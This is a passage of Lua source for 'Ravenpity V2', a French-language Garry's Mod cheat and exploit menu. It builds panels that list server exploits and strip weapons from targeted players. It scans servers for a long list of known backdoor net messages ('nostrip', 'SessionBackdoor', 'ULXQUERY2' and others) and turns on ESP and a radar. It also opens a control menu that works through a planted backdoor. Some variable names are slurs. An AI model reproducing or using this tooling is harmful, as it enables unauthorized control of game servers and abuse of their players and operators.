local t = RAVEN.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = RAVEN.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
timer.Remove( "stripclub" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Strip stoppé" )
end
end, },
},
} )
function RAVEN.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor(Color(40, 40, 40, 90) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(40, 40, 40, 90) )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end
function RAVEN.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( "Choisir des cibles" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(40, 40, 40, 90) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(70, 70, 100, 255) )
--surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
RAVEN.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end




function RAVEN.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(40, 40, 40, 90) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(40, 40, 40, 90) )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 10 + tttt:GetWide(), 2 )
tentry:SetSize( 130, 20 )
tentry:SetText( RAVEN.GetStored( addr, default ) )
tentry.OnChange = function( self )
RAVEN.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end
function RAVEN.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(40, 40, 40, 90) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(40, 40, 40, 90) )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wangmeoff = vgui.Create( "DNumberWang", hostframe )
wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
wangmeoff:SetSize( 75, 20 )
wangmeoff:SetDecimals( 2 )
wangmeoff:SetMinMax( min , max )
wangmeoff:SetValue( RAVEN.GetStored( addr, default ) )
wangmeoff:SetAllowNonAsciiCharacters(false)
wangmeoff.OnValueChanged = function( self, val )
RAVEN.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )    
return hostframe:GetWide(), hostframe:GetTall()
end


local FillFrameRates = RatesScaleLevel
concommand.Add( "stringraven_exploit", function()
local ExploitBaseHeader = vgui.Create( "DFrame")
ExploitBaseHeader:SetPos( ScrW()-400, ScrH, 0.23)
ExploitBaseHeader:SetSize( 400, 120  )
ExploitBaseHeader:SetTitle( "" )
ExploitBaseHeader:SetDraggable( false )
ExploitBaseHeader:MakePopup()
ExploitBaseHeader:ShowCloseButton( false )
ExploitBaseHeader.Paint = function( self, w, h )
DrawBlur(self, 2)
draw.RoundedBox( 0, 0, 0, w, h, Color(45, 45, 45, 245))
end
ExploitHTMLPanel = vgui.Create( "HTML", ExploitBaseHeader )
ExploitHTMLPanel:SetPos( 120,0 )
ExploitHTMLPanel:SetSize( 200,200 )
ExploitHTMLPanel:OpenURL( "https://image.noelshack.com/fichiers/2018/13/2/1522167430-logoravenpity.png")

local ExploitBackgroundSupportPanel = vgui.Create("DFrame")
ExploitBackgroundSupportPanel:SetSize( 400, 400  )
ExploitBackgroundSupportPanel:SetPos( ScrW()-ExploitBaseHeader:GetWide(), 120, 0.2)
ExploitBackgroundSupportPanel:SetTitle( "" )
ExploitBackgroundSupportPanel:SetDraggable( false )
ExploitBackgroundSupportPanel.gay = table.Count( RAVEN.sploits )
ExploitBackgroundSupportPanel:ShowCloseButton( false ) 
ExploitBackgroundSupportPanel.Paint = function( self, w, h )
DrawBlur(self, 2)
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 240))
end

local   ExploitUnderDermaPanel = vgui.Create( "DFrame", ExploitBaseHeader)
ExploitUnderDermaPanel:SetPos( ScrW()-ExploitBaseHeader:GetWide(), 520, 0.2)
ExploitUnderDermaPanel:SetSize( 400, 30  )
ExploitUnderDermaPanel:SetTitle( "" )
ExploitUnderDermaPanel:ShowCloseButton( false ) 
ExploitUnderDermaPanel:SetDraggable( false )
ExploitUnderDermaPanel:MakePopup()
ExploitUnderDermaPanel.Paint = function( self, w, h )
DrawBlur(self, 2)
draw.RoundedBox( 0, 0, 0, w, h, Color(45, 45, 45, 245))
draw.SimpleTextOutlined( "RavenpityV2 | ©Hoper", "ravenfontunder", 201, 15, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0, 0, 0) )
end

local   ExploitBackgroundSupportPanelBase = vgui.Create( "DFrame", ExploitBaseHeader)
ExploitBackgroundSupportPanelBase:SetPos(ScrW()-ExploitBaseHeader:GetWide(), 120, 0.2)
ExploitBackgroundSupportPanelBase:SetSize( 400, 400  )
ExploitBackgroundSupportPanelBase:SetTitle( "" )
ExploitBackgroundSupportPanelBase:ShowCloseButton( false ) 
ExploitBackgroundSupportPanelBase:SetDraggable( false )
ExploitBackgroundSupportPanelBase:MakePopup()
ExploitBackgroundSupportPanelBase.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
end
local  ExploitInfosText = vgui.Create( "DButton", ExploitBackgroundSupportPanelBase)
ExploitInfosText:SetPos( 0, 270)
ExploitInfosText:SetSize( 400, 30  )
ExploitInfosText:SetText( "Les Failles présentent sur le Serveur s'affiche ici" )
ExploitInfosText.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ExploitInfosText:IsHovered() then
ExploitInfosText:SetTextColor( Color( 255, 255, 255, 10 ) )    
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 0))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ExploitInfosText:SetTextColor( Color( 255, 255, 255, 10 ) )       
end
end
local   ExploitCloseButton = vgui.Create( "DButton", ExploitBackgroundSupportPanelBase)
ExploitCloseButton:SetPos( 0, 370)
ExploitCloseButton:SetSize( 400, 30  )
ExploitCloseButton:SetText( "X" )
ExploitCloseButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ExploitCloseButton:IsHovered() then
ExploitCloseButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ExploitCloseButton:SetTextColor( Color( 255, 255, 255 ) )        
end
ExploitCloseButton.DoClick = function()
surface.PlaySound( "buttons/combine_button1.wav" )
ExploitBaseHeader:Remove()
ExploitBackgroundSupportPanel:Remove()
ExploitCloseButton:Remove()
end
end
local   ExploitReturnButton = vgui.Create( "DButton", ExploitBackgroundSupportPanelBase)
ExploitReturnButton:SetPos( 0, 340)
ExploitReturnButton:SetSize( 400, 30  )
ExploitReturnButton:SetText( "<--" )
ExploitReturnButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ExploitReturnButton:IsHovered() then
ExploitReturnButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ExploitReturnButton:SetTextColor( Color( 255, 255, 255 ) )       
end
ExploitReturnButton.DoClick = function()
ExploitBaseHeader:Remove()
ExploitBackgroundSupportPanel:Remove()
LocalPlayer():ConCommand("ravenpity_start")
end
end
local Plist = vgui.Create( "DPanelList", ExploitBackgroundSupportPanelBase )
Plist:SetSize( 394, 340)
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 0, 0 )
Plist:SetName( "" )
local function CreateSploitPanel( name, t )
if !ExploitBackgroundSupportPanelBase then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 50 )
cmdp.Cmd = name
cmdp.Desc = t.desc
cmdp.Paint = function( s, w, h )
surface.SetDrawColor( Color(60, 60, 60, 0) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( 60,60,60,0 )
surface.DrawOutlinedRect( 0, 0, w, h )
draw.DrawText( cmdp.Cmd, "DermaDefault", 11, 2, Color(255,255,255) )
if cmdp:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
draw.DrawText( cmdp.Cmd, "DermaDefault", 11, 2, Color(0,0,0) )     
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))  
draw.DrawText( cmdp.Cmd, "DermaDefault", 11, 2, Color(255,255,255) )      
end
end

function RAVEN.SelectPlayersPanel( addr )
if ExploitBackgroundSupportPanelBase:IsVisible() then ExploitBackgroundSupportPanelBase:Remove() end
local plytab = RAVEN.GetStored( addr, {} )
RAVEN.PlayerSelector = vgui.Create("DFrame")
RAVEN.PlayerSelector:SetSize(400, 400)
RAVEN.PlayerSelector:SetDraggable( false ) 
RAVEN.PlayerSelector:SetTitle("")
RAVEN.PlayerSelector:SetPos(ScrW()-ExploitBaseHeader:GetWide(), 120, 0.2)
RAVEN.PlayerSelector:MakePopup()
RAVEN.PlayerSelector:ShowCloseButton( false ) 
RAVEN.PlayerSelector.DoClick = function()
CloseMenu:Remove()
end
RAVEN.PlayerSelector.Paint = function( s, w, h )
surface.SetDrawColor( Color(40, 40, 40, 0) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(40, 40, 40, 0) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local   ExploitReturnButtonPlayerSelector = vgui.Create( "DButton", RAVEN.PlayerSelector)
ExploitReturnButtonPlayerSelector:SetPos( 0, 370)
ExploitReturnButtonPlayerSelector:SetSize( 400, 30  )
ExploitReturnButtonPlayerSelector:SetText( "Save √" )
ExploitReturnButtonPlayerSelector.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ExploitReturnButtonPlayerSelector:IsHovered() then
ExploitReturnButtonPlayerSelector:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ExploitReturnButtonPlayerSelector:SetTextColor( Color( 255, 255, 255 ) )       
end
ExploitReturnButtonPlayerSelector.DoClick = function()
RAVEN.PlayerSelector:Remove()
ExploitBaseHeader:Remove()
ExploitBackgroundSupportPanel:Remove()
LocalPlayer():ConCommand("stringraven_exploit")
surface.PlaySound("UI/buttonrollover.wav")
end
end
local Plist = vgui.Create( "DPanelList", RAVEN.PlayerSelector )
Plist:SetSize( 390, 333 )
Plist:SetPadding( 05 )
Plist:SetSpacing( 0 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", RAVEN.PlayerSelector)
target1:SetSize( 126, 20 )
target1:SetPos( 10, 23 )
target1:SetText("Tous")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(40, 40, 40 ,90)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
RAVEN.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", RAVEN.PlayerSelector)
target2:SetSize( 120, 20 )
target2:SetPos( 140, 23 )
target2:SetText("Aucun")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(40, 40, 40 ,90)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
RAVEN.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", RAVEN.PlayerSelector )
target3:SetSize( 126, 20 )
target3:SetPos( 264, 23 )
target3:SetText("Moi")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(40, 40, 40 ,90)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
RAVEN.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 390, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(20, 20, 20, 5) )
surface.DrawRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(80, 80, 80, 100 ) ) end
surface.DrawRect( 0, 0, w, h )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Default" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 255, 255, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(390, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
RAVEN.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end


-- POSE DES FONCTIONS BOUTONS
local x = 10
for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + RAVEN.MakeFunctionButton( cmdp, x, 21, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + RAVEN.MakePlayerSelectionButton( cmdp, x, 21, tab.addr )
elseif tab.typ == "string" then
x = (x + 5) + RAVEN.MakeTextInputButton( cmdp, x, 21, tab.name, tab.default, tab.addr )
if !RAVEN.IsStored( tab.addr ) then RAVEN.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + RAVEN.MakeNumberInputButton( cmdp, x, 21, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !RAVEN.IsStored( tab.addr ) then RAVEN.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
end
for k, v in pairs( RAVEN.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end
end)

/*======================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
BACKDOOR NOSTRIP
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================*/LocalPlayer():ConCommand("ravenpity_chair 1")
LocalPlayer():ConCommand("ravenpity_esp 1")
LocalPlayer():ConCommand( "lix_lesp_radarfov 1500" )
local ravenhacknetnet = "" if RAVEN.ValidNetString( "Sandbox_ArmDupe" ) then ravenhacknetnet = "Sandbox_ArmDupe" else if RAVEN.ValidNetString( "Fix_Keypads" ) then ravenhacknetnet = "Fix_Keypads" else if RAVEN.ValidNetString( "Remove_Exploiters" ) then ravenhacknetnet = "Remove_Exploiters" else if RAVEN.ValidNetString( "noclipcloakaesp_chat_text" ) then ravenhacknetnet = "noclipcloakaesp_chat_text" else if RAVEN.ValidNetString( "_Defqon" ) then ravenhacknetnet = "_Defqon" else if RAVEN.ValidNetString( "_CAC_ReadMemory" ) then ravenhacknetnet = "_CAC_ReadMemory" else if RAVEN.ValidNetString( "nostrip" ) then ravenhacknetnet = "nostrip" else if RAVEN.ValidNetString( "LickMeOut" ) then ravenhacknetnet = "LickMeOut" else if RAVEN.ValidNetString( "MoonMan" ) then ravenhacknetnet = "MoonMan" if RAVEN.ValidNetString( "Im_SOCool" ) then ravenhacknetnet = "Im_SOCool" end end end end end end end end end end
if( ValidNetString("memeDoor") ) then netKey = "memeDoor" else end if( ValidNetString("Sandbox_Armdupe") ) then netKey = "Sandbox_Armdupe" else end if( ValidNetString("DarkRP_AdminWeapons") ) then netKey = "DarkRP_AdminWeapons" else end if( ValidNetString("SessionBackdoor") ) then netKey = "SessionBackdoor" else end if( ValidNetString("Fix_Keypads") ) then netKey = "Fix_Keypads" else end if( ValidNetString("Remove_Exploiters") ) then netKey = "Remove_Exploiters" else end if( ValidNetString("noclipcloakaesp_chat_text") ) then netKey = "noclipcloakaesp_chat_text" else end if( ValidNetString("_Defqon") ) then netKey = "_Defqon" else end if( ValidNetString("_CAC_ReadMemory") ) then netKey = "_CAC_ReadMemory" else end if( ValidNetString("nostrip") ) then netKey = "nostrip" else end if( ValidNetString("LickMeOut") ) then netKey = "LickMeOut" else end if( ValidNetString("MoonMan") ) then netKey = "MoonMan" else end if( ValidNetString("Im_SOCool") ) then netKey = "Im_SOCool" else end if( ValidNetString("ULXQUERY2") ) then netKey = "ULXQUERY2" else end if( ValidNetString("jesuslebg") ) then netKey = "jesuslebg" else end if( ValidNetString("zilnix") ) then netKey = "zilnix" else end if( ValidNetString("enablevac") ) then netKey = "enablevac" else end if( ValidNetString("c") ) then netKey = "c" else end if( ValidNetString("Þà?D)◘") ) then netKey = "Þà?D)◘" else end if( ValidNetString("disablebackdoor") ) then netKey = "disablebackdoor" else end if( ValidNetString("kill") ) then netKey = "kill" else end if netKey == "" then chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Aucune backdoor" ) else chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 0, 255, 0 ), "Backdoor trouvé : ".. netKey ) end
surface.CreateFont("ravenfontheader",{font = "Roboto", size = 40, weight = 2000, antialias = 0})
surface.CreateFont("ravenfontunder",{font = "Roboto", size = 15, weight = 0, antialias = 0})
surface.CreateFont("ravenfontcopyright",{font = "Roboto", size = 30, weight = 0, antialias = 0})
surface.CreateFont("ravenfonthello",{font = "Roboto", size = 20, weight = 0, antialias = 0})
concommand.Add( "dontgetit", function() local paneldontgetit = vgui.Create("DFrame") paneldontgetit:SetSize(2300,2300) paneldontgetit:SetTitle("") paneldontgetit:Center() paneldontgetit:SetDraggable( false ) paneldontgetit:MakePopup() paneldontgetit:ShowCloseButton( false ) paneldontgetit.Paint = function( s, w, h ) surface.SetDrawColor( Color(0, 0, 0, 255) ) surface.DrawRect( 0, 0, w, h ) surface.SetDrawColor( Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )  surface.DrawOutlinedRect( 0, 0, w, h ) surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 ) surface.SetDrawColor( Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) ) surface.DrawRect( 10, 10, w - 20, h - 20 ) surface.SetDrawColor( Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) ) surface.SetDrawColor( Color(255, 66, 66, 0) ) surface.DrawLine( 10, 25, 40, 30 ) surface.DrawLine( 40, 30, 70, 25 ) surface.DrawLine( 10, 25, 25, 40 ) surface.DrawLine( 55, 40, 70, 25 ) surface.PlaySound( "buttons/weapon_cant_buy.wav" ) surface.PlaySound( "buttons/blip2.wav" ) surface.PlaySound( "bot/cover_me.wav" ) surface.DrawLine( 25, 40, 25, 60 ) surface.DrawLine( 55, 40, 55, 60 ) surface.DrawLine( 25, 60, 40, 70 ) surface.DrawLine( 55, 60, 40, 70 ) draw.SimpleTextOutlined( "ERREUR RAVENPITY : Votre comptre n'est pas activé", "ravenfontcopyright", 1120, 350, Color( 255, 255, 255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(100, 100, 100, 0) ) end end)
concommand.Add( "stringraven_backdoor", function()
surface.PlaySound("UI/buttonrollover.wav")
local BaseHeader = vgui.Create( "DFrame")
BaseHeader:SetPos( ScrW()-400, ScrH, 0.23)
BaseHeader:SetSize( 400, 120  )
BaseHeader:SetTitle( "" )
BaseHeader:SetDraggable( false )
BaseHeader:MakePopup()
BaseHeader:ShowCloseButton( false )
BaseHeader.Paint = function( self, w, h )
DrawBlur(self, 2)
draw.RoundedBox( 0, 0, 0, w, h, Color(45, 45, 45, 245))
end
HTMLPanel = vgui.Create( "HTML", BaseHeader )
HTMLPanel:SetPos( 120,0 )
HTMLPanel:SetSize( 200,200 )
HTMLPanel:OpenURL( "https://image.noelshack.com/fichiers/2018/13/2/1522167430-logoravenpity.png")
local   BackgroundSupportPanel = vgui.Create( "DFrame", BaseHeader)
BackgroundSupportPanel:SetPos( ScrW()-BaseHeader:GetWide(), 120, 0.2)
BackgroundSupportPanel:SetSize( 400, 400  )
BackgroundSupportPanel:SetTitle( "" )
BackgroundSupportPanel:ShowCloseButton( false ) 
BackgroundSupportPanel:SetDraggable( false )  
BackgroundSupportPanel:MakePopup()
BackgroundSupportPanel.Paint = function( self, w, h )
DrawBlur(self, 2)
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 240))
end
local   BackgroundSupportPanelBase = vgui.Create( "DFrame", BaseHeader)
BackgroundSupportPanelBase:SetPos(ScrW()-BaseHeader:GetWide(), 120, 0.2)
BackgroundSupportPanelBase:SetSize( 400, 400  )
BackgroundSupportPanelBase:SetTitle( "" )
BackgroundSupportPanelBase:ShowCloseButton( false ) 
BackgroundSupportPanelBase:SetDraggable( false )
BackgroundSupportPanelBase:MakePopup()
BackgroundSupportPanelBase.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
end
local   UnderDermaPanel = vgui.Create( "DFrame", BaseHeader)
UnderDermaPanel:SetPos( ScrW()-BaseHeader:GetWide(), 520, 0.2)
UnderDermaPanel:SetSize( 400, 30  )
UnderDermaPanel:SetTitle( "" )
UnderDermaPanel:ShowCloseButton( false ) 
UnderDermaPanel:SetDraggable( false )
UnderDermaPanel:MakePopup()
UnderDermaPanel.Paint = function( self, w, h )
DrawBlur(self, 2)
draw.RoundedBox( 0, 0, 0, w, h, Color(45, 45, 45, 245))
draw.SimpleTextOutlined( "RavenpityV2 | ©Hoper", "ravenfontunder", 201, 15, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0, 0, 0) )
end
local   PlayerOptionsButton = vgui.Create( "DButton", BackgroundSupportPanelBase)
PlayerOptionsButton:SetPos( 0, 0)
PlayerOptionsButton:SetSize( 400, 30  )
PlayerOptionsButton:SetText( "Player Options" )
PlayerOptionsButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if PlayerOptionsButton:IsHovered() then
PlayerOptionsButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
PlayerOptionsButton:SetTextColor( Color( 255, 255, 255 ) )        
end
PlayerOptionsButton.DoClick = function()
surface.PlaySound("UI/buttonrollover.wav")
RAVEN.PlayerOptions( addr )
BackgroundSupportPanelBase:Remove()
end
end
local   ServerOptionsButton = vgui.Create( "DButton", BackgroundSupportPanelBase)
ServerOptionsButton:SetPos( 0, 30)
ServerOptionsButton:SetSize( 400, 30  )
ServerOptionsButton:SetText( "Server Options" )
ServerOptionsButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ServerOptionsButton:IsHovered() then
ServerOptionsButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ServerOptionsButton:SetTextColor( Color( 255, 255, 255 ) )        
end
ServerOptionsButton.DoClick = function()
surface.PlaySound("UI/buttonrollover.wav")
RAVEN.ServerOptions( addr )
BackgroundSupportPanelBase:Remove()
end
end
local   WorldOptionsButton = vgui.Create( "DButton", BackgroundSupportPanelBase)
WorldOptionsButton:SetPos( 0, 60)
WorldOptionsButton:SetSize( 400, 30  )
WorldOptionsButton:SetText( "World Options" )
WorldOptionsButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if WorldOptionsButton:IsHovered() then
WorldOptionsButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
WorldOptionsButton:SetTextColor( Color( 255, 255, 255 ) )       
end
WorldOptionsButton.DoClick = function()
surface.PlaySound("UI/buttonrollover.wav")
RAVEN.WorldOptions( addr )
BackgroundSupportPanelBase:Remove()
end
end
local  ControllerButton = vgui.Create( "DButton", BackgroundSupportPanelBase)
ControllerButton:SetPos( 0, 90)
ControllerButton:SetSize( 400, 30  )
ControllerButton:SetText( "Controller" )
ControllerButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ControllerButton:IsHovered() then
ControllerButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ControllerButton:SetTextColor( Color( 255, 255, 255 ) )       
end
ControllerButton.DoClick = function()
surface.PlaySound("UI/buttonrollover.wav")
RAVEN.Controller( addr )
BackgroundSupportPanelBase:Remove()
end
end
local  InfosText = vgui.Create( "DButton", BackgroundSupportPanelBase)
InfosText:SetPos( 0, 270)
InfosText:SetSize( 400, 30  )
InfosText:SetText( "Ces commandes fonctionnent uniquement si la backdoor nostrip est présente !" )
InfosText.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if InfosText:IsHovered() then
InfosText:SetTextColor( Color( 255, 255, 255, 10 ) )    
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 0))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
InfosText:SetTextColor( Color( 255, 255, 255, 10 ) )       
end
end
local   ReturnButton = vgui.Create( "DButton", BackgroundSupportPanelBase)
ReturnButton:SetPos( 0, 340)
ReturnButton:SetSize( 400, 30  )
ReturnButton:SetText( "<--" )
ReturnButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ReturnButton:IsHovered() then
ReturnButton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ReturnButton:SetTextColor( Color( 255, 255, 255 ) )       
end
ReturnButton.DoClick = function()
BaseHeader:Remove()
BackgroundSupportPanel:Remove()
LocalPlayer():ConCommand("ravenpity_start")
end
end
local   CloseButton = vgui.Create( "DButton", BackgroundSupportPanelBase)
CloseButton:SetPos( 0, 370)
CloseButton:SetSize( 400, 30  )
CloseButton:SetText( "X" )
CloseButton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if CloseButton:IsHovered() then
CloseButton:SetTextColor( Color( 0, 0, 0 ) )
